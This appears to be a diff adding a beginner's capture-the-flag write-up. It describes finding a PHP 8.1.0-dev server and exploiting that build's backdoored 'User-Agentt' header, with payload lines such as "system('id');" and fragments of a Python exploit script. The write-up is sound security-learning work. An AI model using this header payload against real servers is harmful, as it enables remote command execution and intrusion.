@@ -1,0 +1,82 @@
+I started with an nmap scan:
+
+ORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+
+
+I didn't really tried any research with that info (which i later regreted it), so I ran gobuster as well but dindn't get anything.
+
+
+I explored the website but I couldn't click on anything. 
+So I tried XSS payloads, Path traversal and nothing worked.
+
+After a while I found this on a get request: 
+https://source.unsplash.com/Mv9hjnEUHR4/60x60
+
+This is a direct image embed from Unsplash, a popular free image hosting service so nothing useful.
+
+
+
+After a while I decided to see the gobuster results because it was still loading and I saw the nmap command with the php version
+so I decided to acutally look for vulnerabilities with that version.
+
+First thing I found was: https://www.exploit-db.com/exploits/49933
+
+If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header. 
+If someone sends a User-Agentt (note the extra "T") header in an HTTP request...
+The server will evaluate it as PHP code using eval()
+
+Anyone can send:
+User-Agentt: phpinfo();
+
+
+
+
+EXPLANATION
+
+Here’s the basic logic of the Python script:
+Takes the target URL from the user:
+
+url = sys.argv[1]
+
+ Builds a request with a malicious header:
+
+headers = {
+    "User-Agentt": "system('id');"
+
+Sends the HTTP request:
+
+requests.get(url, headers=headers)
+
+. Prints the result of the command:
+
+print(r.text)
+
+
+So basically, this script abuses it by sending User-Agentt: system('command')
+
+
+
+After that I had root access and used:
+find / -name "flag*" 2>/dev/null
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
